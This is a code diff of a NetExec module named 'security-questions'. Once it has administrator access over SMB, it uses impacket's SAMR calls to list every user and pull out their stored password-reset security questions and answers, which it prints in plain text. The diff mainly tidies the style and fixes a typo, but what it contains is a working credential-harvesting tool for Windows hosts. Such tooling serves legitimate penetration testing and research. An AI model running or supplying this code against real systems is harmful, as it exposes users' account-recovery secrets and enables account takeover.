@@ -1,26 +1,25 @@
-from impacket.dcerpc.v5 import samr, epm, transport
+from impacket.dcerpc.v5 import samr, transport
 from impacket.nt_errors import STATUS_MORE_ENTRIES
 from impacket.dcerpc.v5.rpcrt import DCERPCException
-
 import json
 
+
 class NXCModule:
-    '''
+    """
     Module by Adamkadaban: @Adamkadaban
     Based on research from @0gtweet (@gtworek)
 
     Much of this code was copied from add_computer.py
-    '''
+    """
 
-    name = 'security-questions'
-    description = 'Gets security questions and answers for users on computer'
-    supported_protocols = ['smb']
+    name = "security-questions"
+    description = "Gets security questions and answers for users on computer"
+    supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
 
     def options(self, context, module):
         pass
-
 
     def on_admin_login(self, context, connection):
         self.__domain = connection.domain
@@ -47,15 +46,13 @@ class NXCModule:
 
         self.getSAMRResetInfo(context)
 
-
-
-    def getSAMRResetInfo(self,context):
-        stringbinding = r'ncacn_np:%s[\pipe\samr]' % self.__targetIp
+    def getSAMRResetInfo(self, context):
+        stringbinding = f"ncacn_np:{self.__targetIp}[\\pipe\\samr]"
         rpctransport = transport.DCERPCTransportFactory(stringbinding)
         rpctransport.set_dport(445)
         rpctransport.setRemoteHost(self.__targetIp)
 
-        if hasattr(rpctransport, 'set_credentials'):
+        if hasattr(rpctransport, "set_credentials"):
             # This method exists only for selected protocol sequences.
             rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                          self.__nthash, self.__aesKey)
@@ -67,54 +64,51 @@ class NXCModule:
             dce.bind(samr.MSRPC_UUID_SAMR)
 
             resp = samr.hSamrConnect(dce)
-            serverHandle = resp['ServerHandle']
+            serverHandle = resp["ServerHandle"]
 
             resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
-            domains = resp['Buffer']['Buffer']
+            domains = resp["Buffer"]["Buffer"]
 
-            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])
+            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]["Name"])
 
-            resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
-            domainHandle = resp['DomainHandle']
+            resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=resp["DomainId"])
+            domainHandle = resp["DomainHandle"]
 
             status = STATUS_MORE_ENTRIES
             enumerationContext = 0
 
             while status == STATUS_MORE_ENTRIES:
                 try:
-                    resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext = enumerationContext)
-                except DCERPCExcpetion as e:
-                    if str(e).find('STATUS_MORE_ENTRIES') < 0:
+                    resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
+                except DCERPCException as e:
+                    if str(e).find("STATUS_MORE_ENTRIES") < 0:
                         raise 
                     resp = e.get_packet()
 
-                for user in resp['Buffer']['Buffer']:
-                    r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])
-                    info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'], samr.USER_INFORMATION_CLASS.UserResetInformation)
+                for user in resp["Buffer"]["Buffer"]:
+                    r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user["RelativeId"])
+                    info = samr.hSamrQueryInformationUser2(dce, r["UserHandle"], samr.USER_INFORMATION_CLASS.UserResetInformation)
 
-                    resetData = info['Buffer']['Reset']['ResetData']
-                    if resetData == b'':
+                    resetData = info["Buffer"]["Reset"]["ResetData"]
+                    if resetData == b"":
                         break
                     resetData = json.loads(resetData)
-                    questions = resetData['questions']
+                    questions = resetData["questions"]
 
                     if len(questions) == 0:
                         context.log.highlight(f"User {user['Name']} has no security questions")
                     else:
                         for qna in questions:
-                            question = qna['question']
-                            answer = qna['answer']
+                            question = qna["question"]
+                            answer = qna["answer"]
                             context.log.highlight(f"{user['Name']} - {question}: {answer}")
 
-                    samr.hSamrCloseHandle(dce, r['UserHandle'])
-                enumerationContext = resp['EnumerationContext']
-                status = resp['ErrorCode']
+                    samr.hSamrCloseHandle(dce, r["UserHandle"])
+                enumerationContext = resp["EnumerationContext"]
+                status = resp["ErrorCode"]
 
         except Exception as e:
             print(str(e))
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
-                traceback.print_exc()
 
         finally:
             if domainHandle is not None:
